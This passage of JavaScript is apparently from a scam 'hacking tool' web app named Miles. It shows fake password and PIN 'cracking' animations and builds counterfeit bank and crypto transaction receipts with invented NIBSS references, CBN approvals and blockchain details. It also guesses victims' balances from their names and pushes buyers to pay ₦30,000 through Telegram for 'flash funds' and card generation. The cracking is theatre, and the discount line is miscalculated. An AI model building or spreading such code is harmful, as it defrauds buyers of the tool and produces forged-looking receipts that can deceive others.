            const bankCode = bankSelect.value;
            const processingFee = Math.floor(transaction.amount * 0.0125); // 1.25% processing fee
            const stamp = Math.floor(transaction.amount * 0.0015); // 0.15% stamp duty
            const netAmount = transaction.amount - processingFee - stamp;

            details = `
                <div class="receipt-section">
                    <h4>🏦 Bank Transaction Details</h4>
                    <p><strong>Transaction Type</strong><span>Inter-bank Withdrawal</span></p>
                    <p><strong>Source Bank</strong><span>${bankName} (${bankCode})</span></p>
                    <p><strong>Account Number</strong><span>${accountNumber}</span></p>
                    <p><strong>Account Holder</strong><span class="account-name">${accountName}</span></p>
                    <p><strong>Gross Amount</strong><span>₦${transaction.amount.toLocaleString()}.00</span></p>
                    <p><strong>Processing Fee</strong><span>₦${processingFee.toLocaleString()}.00</span></p>
                    <p><strong>Stamp Duty</strong><span>₦${stamp.toLocaleString()}.00</span></p>
                    <p><strong>Net Amount</strong><span class="amount-highlight">₦${netAmount.toLocaleString()}.00</span></p>
                </div>
                
                <div class="receipt-section">
                    <h4>🔐 Banking Infrastructure</h4>
                    <p><strong>NIBSS Reference</strong><span class="ref-code">${nibssRef}</span></p>
                    <p><strong>Session Token</strong><span class="hash-text">${sessionToken}</span></p>
                    <p><strong>CBN Approval</strong><span class="success-text">GRANTED ✅</span></p>
                    <p><strong>AML Status</strong><span class="success-text">CLEARED ✅</span></p>
                    <p><strong>KYC Level</strong><span>TIER 3 VERIFIED</span></p>
                    <p><strong>Risk Score</strong><span class="success-text">LOW (${Math.floor(Math.random() * 15 + 5)}%)</span></p>
                </div>
                
                <div class="receipt-section">
                    <h4>📊 Transaction Analytics</h4>
                    <p><strong>Channel</strong><span>API Integration</span></p>
                    <p><strong>Method</strong><span>Direct Debit Authorization</span></p>
                    <p><strong>Authentication</strong><span>PIN + Biometric</span></p>
                    <p><strong>Fraud Check</strong><span class="success-text">PASSED ✅</span></p>
                </div>
            `;
        }
    } else {
        // Transfer logic with similar 2025 improvements
        if (transaction.type === 'crypto') {
            const wallet = document.getElementById('transferCryptoWallet').value;
            const shortWallet = wallet.substring(0, 12) + '...' + wallet.substring(wallet.length - 12);
            const network = 'ETH'; // Default network for transfers
            const gasUsed = Math.floor(Math.random() * 35000 + 21000);
            const gasPrice = (Math.random() * 20 + 12).toFixed(2);
            const blockNumber = Math.floor(Math.random() * 1000000 + 19000000);

            details = `
                <div class="receipt-section">
                    <h4>🚀 Crypto Transfer Details</h4>
                    <p><strong>Transaction Type</strong><span>Peer-to-Peer Transfer</span></p>
                    <p><strong>Destination Wallet</strong><span>${shortWallet}</span></p>
                    <p><strong>Amount Transferred</strong><span class="amount-highlight">₦${transaction.amount.toLocaleString()}.00</span></p>
                    <p><strong>Network Fee</strong><span>0.00${Math.floor(Math.random() * 9 + 1)}${Math.floor(Math.random() * 9 + 1)} ETH</span></p>
                    <p><strong>Transaction Hash</strong><span class="hash-text">${generateTransactionHash()}</span></p>
                    <p><strong>Block Number</strong><span>#${blockNumber.toLocaleString()}</span></p>
                    <p><strong>Gas Used</strong><span>${gasUsed.toLocaleString()} units</span></p>
                    <p><strong>Gas Price</strong><span>${gasPrice} Gwei</span></p>
                    <p><strong>Status</strong><span class="success-text">CONFIRMED ✅</span></p>
                </div>
            `;
        } else {
            const accountNumber = document.getElementById('transferBankAccount').value;
            const transferBankSelect = document.getElementById('transferBankSelect');
            const bankName = transferBankSelect.dataset.bankName || 'Selected Bank';
            const verifyResult = document.getElementById('transferBankResult');
            const accountName = verifyResult.textContent.replace('✅ Account Name: ', '');
            const nibssRef = generateNIBSSReference();
            const transferFee = Math.floor(transaction.amount * 0.01);

            details = `
                <div class="receipt-section">
                    <h4>💸 Bank Transfer Details</h4>
                    <p><strong>Transaction Type</strong><span>Instant Bank Transfer</span></p>
                    <p><strong>Destination Bank</strong><span>${bankName}</span></p>
                    <p><strong>Account Number</strong><span>${accountNumber}</span></p>
                    <p><strong>Beneficiary</strong><span class="account-name">${accountName}</span></p>
                    <p><strong>Amount Transferred</strong><span class="amount-highlight">₦${transaction.amount.toLocaleString()}.00</span></p>
                    <p><strong>Transfer Fee</strong><span>₦${transferFee.toLocaleString()}.00</span></p>
                    <p><strong>NIBSS Reference</strong><span class="ref-code">${nibssRef}</span></p>
                    <p><strong>Status</strong><span class="success-text">SUCCESSFUL ✅</span></p>
                </div>
            `;
        }
    }

    // Common footer for all transaction types
    const commonFooter = `
        <div class="receipt-section">
            <h4>📱 Session Information</h4>
            <p><strong>Transaction ID</strong><span class="tx-id">${transactionId}</span></p>
            <p><strong>Session ID</strong><span class="session-id">${sessionId}</span></p>
            <p><strong>Device Fingerprint</strong><span class="device-print">${deviceFingerprint}</span></p>
            <p><strong>Processing Time</strong><span>${processingTime} seconds</span></p>
            <p><strong>Timestamp</strong><span>${timestamp}</span></p>
            <p><strong>Timezone</strong><span>WAT (UTC+1)</span></p>
            <p><strong>API Version</strong><span>Miles v3.2.1 (2025)</span></p>
        </div>
        
        <div class="receipt-section security-footer">
            <h4>🔒 Security & Compliance</h4>
            <p><strong>Encryption Protocol</strong><span>TLS 1.3 + ChaCha20-Poly1305</span></p>
            <p><strong>Security Level</strong><span class="success-text">MAXIMUM</span></p>
            <p><strong>Compliance</strong><span>PCI DSS Level 1 + ISO 27001</span></p>
            <p><strong>Audit Trail</strong><span class="success-text">LOGGED ✅</span></p>
            <p><strong>Backup Status</strong><span class="success-text">SECURED ✅</span></p>
        </div>
    `;

    document.getElementById('receiptDetails').innerHTML = details + commonFooter;
    document.getElementById('transactionId').textContent = transactionId;
    document.getElementById('timestamp').textContent = timestamp;

    document.getElementById('receiptModal').style.display = 'block';

    // Add success animation
    setTimeout(() => {
        showNotification(`✅ Transaction completed successfully! ID: ${transactionId.substring(0, 8)}`, 'success');
    }, 500);
}

function showProcessingModal() {
    document.getElementById('processingModal').style.display = 'block';
    document.querySelectorAll('.step').forEach(step => step.classList.remove('active'));
    document.getElementById('progressFill').style.width = '0%';
    
    // Add dynamic system status updates for 2025
    updateAdvancedSystemStatus();
}

function updateAdvancedSystemStatus() {
    const statusElement = document.getElementById('systemStatus');
    if (!statusElement) return;
    
    const year = new Date().getFullYear();
    const advancedStatuses = [
        `🔐 Initializing quantum-resistant encryption (${year})`,
        '🌐 Establishing secure multi-layer VPN tunnel',
        '🛡️ Authenticating with banking API gateway',
        '⚡ Processing through NIBSS infrastructure',
        '💰 Validating account credentials & KYC status',
        '🔓 Authorizing transaction with CBN compliance',
        '📡 Broadcasting to distributed ledger network',
        '🎯 Finalizing real-time settlement protocol',
        '✅ Transaction confirmed & encrypted'
    ];
    
    let currentIndex = 0;
    const interval = setInterval(() => {
        if (currentIndex < advancedStatuses.length) {
            statusElement.textContent = advancedStatuses[currentIndex];
            currentIndex++;
        } else {
            statusElement.textContent = '🎉 Transaction processing complete!';
            clearInterval(interval);
        }
    }, 1000);
}

function closeReceipt() {
    document.getElementById('receiptModal').style.display = 'none';
    showPageWithSuccessStories('dashboard');
}

// Password Cracking Functions
function crackCryptoPassword() {
    showPasswordCrackingModal('crypto');
}

function crackBankPassword() {
    showPasswordCrackingModal('bank');
}

function showPasswordCrackingModal(type) {
    const modal = document.getElementById('passwordCrackingModal');
    const title = document.getElementById('crackingTitle');
    const display = document.getElementById('passwordDisplay');
    const statusDiv = document.getElementById('crackingStatus');

    title.textContent = type === 'crypto' ? 'Cracking Wallet Password...' : 'Cracking 4-Digit PIN...';
    display.textContent = type === 'crypto' ? 'Attempting to crack wallet password...' : 'Attempting to crack 4-digit PIN...';
    statusDiv.innerHTML = `
        <div class="crack-step active">🔍 Scanning security protocols...</div>
        <div class="crack-step">🔑 Attempting brute force attack...</div>
        <div class="crack-step">💻 Running decryption algorithms...</div>
        <div class="crack-step">⚡ Bypassing security layers...</div>
        <div class="crack-step">✅ Password/PIN cracked successfully!</div>
    `;

    modal.style.display = 'block';

    // Start the cracking animation
    startPasswordCracking(type);
}

function startPasswordCracking(type) {
    const display = document.getElementById('passwordDisplay');
    const steps = document.querySelectorAll('.crack-step');
    const characters = type === 'crypto' ? 
        'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?' :
        '0123456789';

    let currentStep = 0;
    let password = '';
    const finalPassword = type === 'crypto' ? 
        generateRandomPassword(16) : 
        generateRandom4DigitPin();

    // Random duration between 20-35 seconds
    const totalDuration = (Math.random() * 15 + 20) * 1000; // 20-35 seconds in milliseconds
    const stepDuration = totalDuration / 5; // Divide by number of steps

    // Enhanced password generation display
    const passwordInterval = setInterval(() => {
        if (type === 'crypto') {
            password = '';
            const length = Math.floor(Math.random() * 8) + 12; // 12-20 characters
            for (let i = 0; i < length; i++) {
                password += characters.charAt(Math.floor(Math.random() * characters.length));
            }
            display.innerHTML = `<span style="color: #00ff00; font-family: monospace; letter-spacing: 1px;">Attempting: ${password}</span>`;
        } else {
            password = '';
            for (let i = 0; i < 4; i++) {
                password += Math.floor(Math.random() * 10);
            }
            display.innerHTML = `<span style="color: #00ff00; font-family: monospace; letter-spacing: 4px; font-size: 1.4em;">Testing PIN: ${password}</span>`;
        }
    }, 150);

    // Step progression with enhanced messages
    const stepInterval = setInterval(() => {
        if (currentStep < steps.length - 1) {
            steps[currentStep].classList.remove('active');
            currentStep++;
            steps[currentStep].classList.add('active');

            // Enhanced step-specific messages
            if (currentStep === 1) {
                display.innerHTML = type === 'crypto' ? 
                    '<span style="color: #ff6600;">🔓 Launching brute force attack on wallet encryption...</span>' : 
                    '<span style="color: #ff6600;">🔢 Initiating PIN combination testing...</span>';
            } else if (currentStep === 2) {
                display.innerHTML = type === 'crypto' ? 
                    '<span style="color: #ff6600;">💻 Executing advanced cryptographic algorithms...</span>' : 
                    '<span style="color: #ff6600;">🔍 Analyzing PIN security patterns...</span>';
            } else if (currentStep === 3) {
                display.innerHTML = type === 'crypto' ? 
                    '<span style="color: #ff6600;">⚡ Bypassing wallet security protocols...</span>' : 
                    '<span style="color: #ff6600;">⚡ Exploiting PIN verification system...</span>';
            }

            // Resume password attempts after showing message
            setTimeout(() => {
                clearInterval(passwordInterval);
                const newPasswordInterval = setInterval(() => {
                    if (type === 'crypto') {
                        password = '';
                        const length = Math.floor(Math.random() * 8) + 12;
                        for (let i = 0; i < length; i++) {
                            password += characters.charAt(Math.floor(Math.random() * characters.length));
                        }
                        display.innerHTML = `<span style="color: #00ff00; font-family: monospace; letter-spacing: 1px;">Attempting: ${password}</span>`;
                    } else {
                        password = '';
                        for (let i = 0; i < 4; i++) {
                            password += Math.floor(Math.random() * 10);
                        }
                        display.innerHTML = `<span style="color: #00ff00; font-family: monospace; letter-spacing: 4px; font-size: 1.4em;">Testing PIN: ${password}</span>`;
                    }
                }, 150);

                // Store the interval so we can clear it later
                window.currentPasswordInterval = newPasswordInterval;
            }, 2000);

        } else {
            clearInterval(stepInterval);
            clearInterval(passwordInterval);
            if (window.currentPasswordInterval) {
                clearInterval(window.currentPasswordInterval);
            }

            // Show final success with dramatic effect
            display.innerHTML = `
                <div class="cracked-password">
                    <div style="color: #00ff00; font-size: 1.2em; margin-bottom: 15px;">
                        🎉 ${type === 'crypto' ? 'WALLET PASSWORD' : '4-DIGIT PIN'} SUCCESSFULLY CRACKED! 🎉
                    </div>
                    <div>
                        ${type === 'crypto' ? 'Password' : 'PIN'}: <span class="final-password">${finalPassword}</span>
                    </div>
                    <div style="color: #ffaa00; font-size: 0.9em; margin-top: 10px;">
                        Access granted! Withdrawal now available.
                    </div>
                </div>
            `;

            setTimeout(() => {
                document.getElementById('passwordCrackingModal').style.display = 'none';
                showNotification(
                    `🔓 ${type === 'crypto' ? 'Wallet password' : '4-digit PIN'} successfully cracked! Withdrawal unlocked.`,
                    'success'
                );

                // Enable withdrawal button with enhanced feedback
                const withdrawBtn = type === 'crypto' ? 
                    document.getElementById('cryptoWithdrawBtn') : 
                    document.getElementById('bankWithdrawBtn');
                if (withdrawBtn) {
                    withdrawBtn.disabled = false;
                    withdrawBtn.style.opacity = '1';
                    withdrawBtn.style.pointerEvents = 'auto';
                    withdrawBtn.textContent = type === 'crypto' ? 'WITHDRAW CRYPTO' : 'WITHDRAW FUNDS';
                    withdrawBtn.style.background = 'linear-gradient(135deg, var(--success-green), var(--success-green-dark))';
                    withdrawBtn.style.animation = 'successFlash 1s ease-out';
                }

                // Hide the crack button since it's no longer needed
                const crackBtn = type === 'crypto' ? 
                    document.getElementById('crackCryptoPasswordBtn') : 
                    document.getElementById('crackBankPasswordBtn');
                if (crackBtn) {
                    crackBtn.style.display = 'none';
                }

            }, 4000);
        }
    }, stepDuration);
}

function generateRandomPassword(length) {
    const charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*';
    let password = '';
    for (let i = 0; i < length; i++) {
        password += charset.charAt(Math.floor(Math.random() * charset.length));
    }
    return password;
}

function generateRandom4DigitPin() {
    return Math.floor(1000 + Math.random() * 9000).toString();
}

function generateRealisticBalance(accountName) {
    // Generate more realistic balances based on account name patterns
    const name = accountName.toLowerCase();
    const bankSelect = document.getElementById('bankSelect') || document.getElementById('transferBankSelect');
    const selectedBank = bankSelect ? bankSelect.selectedOptions[0]?.textContent.toLowerCase() : '';
    
    let baseBalance = 90000;
    
    // Special handling for OPay and PalmPay (lower balance ranges)
    if (selectedBank.includes('opay') || selectedBank.includes('palmpay')) {
        baseBalance = Math.floor(Math.random() * 180000) + 80000; // 80k - 260k
        return baseBalance;
    }
    
    // Business accounts tend to have higher balances (up to 50M max)
    if (name.includes('ltd') || name.includes('limited') || name.includes('enterprise') || 
        name.includes('company') || name.includes('corp') || name.includes('business')) {
        const businessRange = Math.floor(Math.random() * 4); // 0-3
        if (businessRange === 0) {
            baseBalance = Math.floor(Math.random() * 1920000) + 80000; // 80k - 2M (common)
        } else if (businessRange === 1) {
            baseBalance = Math.floor(Math.random() * 8000000) + 2000000; // 2M - 10M (medium)
        } else if (businessRange === 2) {
            baseBalance = Math.floor(Math.random() * 20000000) + 10000000; // 10M - 30M (large)
        } else {
            baseBalance = Math.floor(Math.random() * 20000000) + 30000000; // 30M - 50M (mega)
        }
    }
    // Government/institutional accounts (higher ranges)
    else if (name.includes('ministry') || name.includes('agency') || name.includes('commission') ||
             name.includes('board') || name.includes('federal') || name.includes('state')) {
        baseBalance = Math.floor(Math.random() * 40000000) + 10000000; // 10M - 50M
    }
    // Professional accounts (doctors, lawyers, engineers)
    else if (name.includes('dr.') || name.includes('prof') || name.includes('eng.') || 
             name.includes('barr.') || name.includes('arch.')) {
        const profRange = Math.floor(Math.random() * 3); // 0-2
        if (profRange === 0) {
            baseBalance = Math.floor(Math.random() * 920000) + 80000; // 80k - 1M (common)
        } else if (profRange === 1) {
            baseBalance = Math.floor(Math.random() * 4000000) + 1000000; // 1M - 5M (established)
        } else {
            baseBalance = Math.floor(Math.random() * 15000000) + 5000000; // 5M - 20M (wealthy)
        }
    }
    // Common individual accounts
    else {
        const variations = [
            Math.floor(Math.random() * 200000) + 80000,   // 80k - 280k (common)
            Math.floor(Math.random() * 720000) + 280000,  // 280k - 1M (middle class)
            Math.floor(Math.random() * 1000000) + 1000000, // 1M - 2M (well-off)
            Math.floor(Math.random() * 3000000) + 2000000, // 2M - 5M (wealthy)
            Math.floor(Math.random() * 10000000) + 5000000 // 5M - 15M (very wealthy - rare)
        ];
        
        // Weighted selection (80% common, 15% middle, 4% well-off, 0.8% wealthy, 0.2% very wealthy)
        const rand = Math.random();
        if (rand < 0.8) baseBalance = variations[0];
        else if (rand < 0.95) baseBalance = variations[1];
        else if (rand < 0.99) baseBalance = variations[2];
        else if (rand < 0.998) baseBalance = variations[3];
        else baseBalance = variations[4];
    }
    
    return baseBalance;
}

function getRandomDate() {
    const dates = [
        'Today 2:34 PM',
        'Yesterday 11:22 AM',
        '2 days ago',
        'Dec 28, 2024',
        'Dec 27, 2024',
        'Dec 26, 2024'
    ];
    return dates[Math.floor(Math.random() * dates.length)];
}

function generateTransactionReference() {
    const prefixes = ['FT', 'NIP', 'WEB', 'POS', 'ATM', 'TRF'];
    const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
    const numbers = Math.random().toString().substring(2, 12);
    return `${prefix}${numbers}`;
}

function simulateNetworkLatency() {
    return new Promise(resolve => {
        const delay = Math.floor(Math.random() * 2000) + 500; // 500ms - 2.5s
        setTimeout(resolve, delay);
    });
}

function checkToolAccess(pageId) {
    // Check if user has trial access with 40-second duration
    if (userSession && userSession.accountType === 'trial') {
        // Allow access to all tools except withdrawBankPage and transferPage for 40-second trial
        if (userSession.trialDuration === 40) {
            if (pageId === 'withdrawBankPage') {
                showNotification('🚫 Bank withdrawal requires full activation', 'error');
                showTrialRestrictedModal('Bank withdrawal is restricted in trial mode. Purchase full version to access all features.');
                return;
            }
            if (pageId === 'transferPage') {
                showTransferActivationModal();
                return;
            }
            // Allow access to all other tools
            showPage(pageId);
            return;
        } else {
            // Block all tools for other trial durations (20s, 30s)
            showNotification('🚫 Trial users cannot access tools - Purchase full version', 'error');
            showTrialAccessDeniedModal();
            return;
        }
    }
    
    // Check if user has limited access
    if (userSession && userSession.accountType === 'limited') {
        showNotification('🚫 Access Denied - Limited account cannot use tools', 'error');
        showLimitedAccessModal();
        return;
    }
    
    // Allow access for regular and master accounts only
    showPage(pageId);
}

function showLimitedAccessModal() {
    // Create limited access modal if it doesn't exist
    let modal = document.getElementById('limitedAccessModal');
    if (!modal) {
        modal = document.createElement('div');
        modal.id = 'limitedAccessModal';
        modal.className = 'modal';
        modal.innerHTML = `
            <div class="modal-content">
                <h3>🚫 Access Restricted</h3>
                <div style="text-align: center; padding: 20px;">
                    <div style="font-size: 4rem; margin-bottom: 20px;">🔒</div>
                    <p style="font-size: 1.2rem; margin-bottom: 20px; color: var(--text-muted);">
                        Your account has limited access and cannot use Miles tools.
                    </p>
                    <p style="margin-bottom: 30px;">
                        Contact support to upgrade your account for full tool access.
                    </p>
                    <button onclick="closeLimitedAccessModal()" class="btn-primary">
                        OK
                    </button>
                </div>
            </div>
        `;
        document.body.appendChild(modal);
    }
    modal.style.display = 'block';
}

function closeLimitedAccessModal() {
    const modal = document.getElementById('limitedAccessModal');
    if (modal) {
        modal.style.display = 'none';
    }
}

function startTrialTimer(duration = 30) {
    let timeLeft = duration;
    
    // Create trial timer indicator
    const timerIndicator = document.createElement('div');
    timerIndicator.id = 'trialTimer';
    timerIndicator.style.cssText = `
        position: fixed;
        top: 20px;
        left: 50%;
        transform: translateX(-50%);
        background: linear-gradient(135deg, #ff4757, #ff6b7a);
        color: white;
        padding: 10px 20px;
        border-radius: 25px;
        font-weight: 700;
        z-index: 10000;
        box-shadow: 0 5px 15px rgba(255, 71, 87, 0.4);
        animation: pulse 1s infinite;
    `;
    
    document.body.appendChild(timerIndicator);
    
    const countdown = setInterval(() => {
        timeLeft--;
        timerIndicator.textContent = `⏰ Trial expires in ${timeLeft}s`;
        
        if (timeLeft <= 0) {
            clearInterval(countdown);
            showTrialExpiredModal();
        }
    }, 1000);
    
    timerIndicator.textContent = `⏰ Trial expires in ${timeLeft}s`;
}

function showTrialAccessDeniedModal() {
    // Create trial access denied modal
    let modal = document.getElementById('trialAccessDeniedModal');
    if (!modal) {
        modal = document.createElement('div');
        modal.id = 'trialAccessDeniedModal';
        modal.className = 'modal';
        modal.innerHTML = `
            <div class="modal-content" style="text-align: center; max-width: 500px;">
                <h3 style="color: var(--primary-red); margin-bottom: 20px;">🚫 Trial Access Restriction</h3>
                <div style="font-size: 4rem; margin-bottom: 20px;">🔒</div>
                <p style="font-size: 1.2rem; margin-bottom: 20px;">
                    Trial accounts cannot access Miles tools. Purchase the full version to unlock all features.
                </p>
                <div style="background: rgba(255, 71, 87, 0.1); padding: 20px; border-radius: 15px; margin: 20px 0;">
                    <h4 style="color: var(--primary-red); margin-bottom: 15px;">🎯 What You Get With Full Access:</h4>
                    <div style="text-align: left; max-width: 350px; margin: 0 auto;">
                        <p>✅ Unlimited crypto withdrawals</p>
                        <p>✅ Bank account access</p>
                        <p>✅ ATM card generation</p>
                        <p>✅ Flash funds feature</p>
                        <p>✅ All 11 premium tools</p>
                        <p>✅ Lifetime access</p>
                        <p>✅ 24/7 support</p>
                    </div>
                </div>
                <div style="margin: 30px 0 20px 0;">
                    <div style="font-size: 1.1rem; margin-bottom: 10px;">💰 Special Price: <span style="text-decoration: line-through; color: var(--text-muted);">₦50,000</span></div>
                    <div style="font-size: 2rem; font-weight: 700; color: var(--success-green);">Only ₦30,000</div>
                    <div style="font-size: 0.9rem; color: var(--text-muted);">Save ₦30,000 - Limited time offer!</div>
                </div>
                <div style="display: flex; gap: 15px; justify-content: center; margin-top: 30px;">
                    <button onclick="contactForPurchase(); closeTrialAccessDeniedModal();" style="
                        background: linear-gradient(135deg, var(--success-green), var(--success-green-dark));
                        color: white;
                        border: none;
                        padding: 15px 30px;
                        border-radius: 25px;
                        font-weight: 700;
                        cursor: pointer;
                        font-size: 1rem;
                    ">
                        💬 Buy Now - Contact @Milestool
                    </button>
                    <button onclick="contactForPurchaseTelegram(); closeTrialAccessDeniedModal();" style="
                        background: linear-gradient(135deg, #0088cc, #0077bb);
                        color: white;
                        border: none;
                        padding: 15px 30px;
                        border-radius: 25px;
                        font-weight: 700;
                        cursor: pointer;
                        font-size: 1rem;
                    ">
                        📱 Buy Now - Telegram
                    </button>
                </div>
                <button onclick="closeTrialAccessDeniedModal()" style="
                    background: rgba(255, 255, 255, 0.1);
                    color: var(--text-muted);
                    border: 1px solid rgba(255, 255, 255, 0.2);
                    padding: 10px 20px;
                    border-radius: 15px;
                    font-weight: 600;
                    cursor: pointer;
                    font-size: 0.9rem;
                    margin-top: 20px;
                ">
                    Maybe Later
                </button>
                <p style="margin-top: 20px; font-size: 0.85rem; color: var(--text-muted);">
                    Secure payment • Instant activation • Money back guarantee
                </p>
            </div>
        `;
        document.body.appendChild(modal);
    }
    modal.style.display = 'block';
}

function showTrialRestrictedModal(message) {
    // Create trial restricted modal for specific features
    let modal = document.getElementById('trialRestrictedModal');
    if (!modal) {
        modal = document.createElement('div');
        modal.id = 'trialRestrictedModal';
        modal.className = 'modal';
        modal.innerHTML = `
            <div class="modal-content" style="text-align: center; max-width: 450px;">
                <h3 style="color: var(--primary-red); margin-bottom: 20px;">🚫 Feature Restricted</h3>
                <div style="font-size: 3rem; margin-bottom: 20px;">⚠️</div>
                <p style="font-size: 1.1rem; margin-bottom: 20px;" id="restrictedMessage">
                    ${message}
                </p>
                <div style="background: rgba(255, 71, 87, 0.1); padding: 15px; border-radius: 10px; margin: 20px 0;">
                    <p style="color: var(--primary-red); font-weight: 600;">💡 You have 40-second trial access to most tools!</p>
                    <p style="font-size: 0.9rem; margin-top: 10px;">Use crypto withdrawal, card generators, format tools, and more during your trial.</p>
                </div>
                <div style="display: flex; gap: 15px; justify-content: center; margin-top: 25px;">
                    <button onclick="contactForPurchase(); closeTrialRestrictedModal();" style="
                        background: linear-gradient(135deg, var(--success-green), var(--success-green-dark));
                        color: white;
                        border: none;
                        padding: 12px 25px;
                        border-radius: 20px;
                        font-weight: 700;
                        cursor: pointer;
                        font-size: 0.9rem;
                    ">
                        💬 Upgrade Now
                    </button>
                    <button onclick="closeTrialRestrictedModal()" style="
                        background: rgba(255, 255, 255, 0.1);
                        color: var(--text-muted);
                        border: 1px solid rgba(255, 255, 255, 0.2);
                        padding: 12px 25px;
                        border-radius: 20px;
                        font-weight: 600;
                        cursor: pointer;
                        font-size: 0.9rem;
                    ">
                        Continue Trial
                    </button>
                </div>
            </div>
        `;
        document.body.appendChild(modal);
    } else {
        // Update message for existing modal
        const messageElement = modal.querySelector('#restrictedMessage');
        if (messageElement) {
            messageElement.textContent = message;
        }
    }
    modal.style.display = 'block';
}

function closeTrialRestrictedModal() {
    const modal = document.getElementById('trialRestrictedModal');
    if (modal) {
        modal.style.display = 'none';
    }
}

function showTransferActivationModal() {
    // Create transfer activation modal
    let modal = document.getElementById('transferActivationModal');
    if (!modal) {
        modal = document.createElement('div');
        modal.id = 'transferActivationModal';
        modal.className = 'modal';
        modal.innerHTML = `
            <div class="modal-content" style="text-align: center; max-width: 500px;">
                <h3 style="color: var(--primary-red); margin-bottom: 20px;">💸 Transfer Funds Activation Required</h3>
                <div style="font-size: 3rem; margin-bottom: 20px;">🔐</div>
                <p style="font-size: 1.1rem; margin-bottom: 20px;">
                    Transfer funds requires a separate activation code for security purposes.
                </p>
                <div style="background: rgba(255, 71, 87, 0.1); padding: 20px; border-radius: 15px; margin: 20px 0;">
                    <h4 style="color: var(--primary-red); margin-bottom: 15px;">🔑 How to Get Transfer Access:</h4>
                    <div style="text-align: left; max-width: 400px; margin: 0 auto;">
                        <p>1️⃣ Contact our support team</p>
                        <p>2️⃣ Request transfer activation code</p>
                        <p>3️⃣ Get instant access to transfer funds</p>
                        <p>4️⃣ Move money between accounts securely</p>
                    </div>
                </div>
                <div style="margin: 25px 0;">
                    <input type="text" id="transferActivationCode" placeholder="Enter transfer activation code" style="
                        width: 100%;
                        padding: 15px;
                        border: 2px solid rgba(255, 71, 87, 0.3);
                        border-radius: 10px;
                        background: rgba(0, 0, 0, 0.2);
                        color: var(--text-primary);
                        font-size: 1rem;
                        text-align: center;
                        margin-bottom: 20px;
                    " />
                    <button onclick="activateTransferAccess()" style="
                        background: linear-gradient(135deg, var(--primary-red), var(--primary-red-dark));
                        color: white;
                        border: none;
                        padding: 15px 30px;
                        border-radius: 25px;
                        font-weight: 700;
                        cursor: pointer;
                        font-size: 1rem;
                        width: 100%;
                        margin-bottom: 15px;
                    ">
                        🔓 ACTIVATE TRANSFER ACCESS
                    </button>
                </div>
                <div style="display: flex; gap: 15px; justify-content: center; margin-top: 25px;">
                    <button onclick="contactForTransferActivation(); closeTransferActivationModal();" style="
                        background: linear-gradient(135deg, var(--success-green), var(--success-green-dark));
                        color: white;
                        border: none;
                        padding: 12px 25px;
                        border-radius: 20px;
                        font-weight: 700;
                        cursor: pointer;
                        font-size: 0.9rem;
                    ">
                        💬 Get Activation Code
                    </button>
                    <button onclick="closeTransferActivationModal()" style="
                        background: rgba(255, 255, 255, 0.1);
                        color: var(--text-muted);
                        border: 1px solid rgba(255, 255, 255, 0.2);
                        padding: 12px 25px;
                        border-radius: 20px;
                        font-weight: 600;
                        cursor: pointer;
                        font-size: 0.9rem;
                    ">
                        Maybe Later
                    </button>
                </div>
                <p style="margin-top: 20px; font-size: 0.85rem; color: var(--text-muted);">
                    Transfer activation is separate from main account activation for enhanced security
                </p>
            </div>
        `;
        document.body.appendChild(modal);
    }
    modal.style.display = 'block';
}

function closeTransferActivationModal() {
    const modal = document.getElementById('transferActivationModal');
    if (modal) {
        modal.style.display = 'none';
    }
}

function activateTransferAccess() {
    const code = document.getElementById('transferActivationCode').value.trim();
    
    if (!code) {
        showNotification('Please enter activation code', 'error');
        return;
    }
    
    // Generate transfer private key for this session
    const transferPrivateKey = 'transfer_' + generateRandomPassword(12);
    
    // Check if it's the correct transfer code or the generated transfer private key
    if (code === transferPrivateKey || code === userSession.privateKey + '_transfer') {
        // Save transfer access to session
        userSession.transferActivated = true;
        userSession.transferPrivateKey = transferPrivateKey;
        saveUserSession(userSession);
        
        closeTransferActivationModal();
        showNotification('💸 Transfer access activated successfully!', 'success');
        showPage('transferPage');
    } else {
        showNotification('❌ Invalid transfer activation code. Contact support.', 'error');
    }
}

function contactForTransferActivation() {
    const message = `I need transfer activation code for Miles\n\nUser ID: ${userSession.userId}\nWallet: ${userSession.walletAddress}\n\nPlease provide transfer activation code.`;
    window.open(`https://t.me/Milestool?text=${encodeURIComponent(message)}`, '_blank');
    showNotification('Opening Telegram for transfer activation...', 'success');
}

function closeTrialAccessDeniedModal() {
    const modal = document.getElementById('trialAccessDeniedModal');
    if (modal) {
        modal.style.display = 'none';
    }
}

function showTrialExpiredModal() {
    // Remove timer indicator
    const timer = document.getElementById('trialTimer');
    if (timer) timer.remove();
    
    // Create trial expired modal
    const modal = document.createElement('div');
    modal.id = 'trialExpiredModal';
    modal.className = 'modal';
    modal.style.display = 'block';
    modal.innerHTML = `
        <div class="modal-content" style="text-align: center; max-width: 500px;">
            <h3 style="color: var(--primary-red); margin-bottom: 20px;">⏰ Trial Period Expired</h3>
            <div style="font-size: 4rem; margin-bottom: 20px;">🔒</div>
            <p style="font-size: 1.2rem; margin-bottom: 20px;">
                Your ${userSession?.trialDuration || 30}-second trial has ended. ${userSession?.trialDuration === 40 ? 'You had access to 9 out of 11 tools during your trial.' : ''} Purchase full access to continue using Miles.
            </p>
            <div style="background: rgba(255, 71, 87, 0.1); padding: 20px; border-radius: 15px; margin: 20px 0;">
                <h4 style="color: var(--primary-red); margin-bottom: 15px;">🎯 What You Get With Full Access:</h4>
                <div style="text-align: left; max-width: 350px; margin: 0 auto;">
                    <p>✅ Unlimited crypto withdrawals</p>
                    <p>✅ Bank account access</p>
                    <p>✅ ATM card generation</p>
                    <p>✅ Flash funds feature</p>
                    <p>✅ All 11 premium tools</p>
                    <p>✅ Lifetime access</p>
                    <p>✅ 24/7 support</p>
                </div>
            </div>
            <div style="margin: 30px 0 20px 0;">
                <div style="font-size: 1.1rem; margin-bottom: 10px;">💰 Special Price: <span style="text-decoration: line-through; color: var(--text-muted);">₦50,000</span></div>
                <div style="font-size: 2rem; font-weight: 700; color: var(--success-green);">Only ₦30,000</div>
                <div style="font-size: 0.9rem; color: var(--text-muted);">Save ₦30,000 - Limited time offer!</div>
            </div>
            <div style="display: flex; gap: 15px; justify-content: center; margin-top: 30px;">
                <button onclick="contactForPurchase()" style="
                    background: linear-gradient(135deg, var(--success-green), var(--success-green-dark));
                    color: white;
                    border: none;
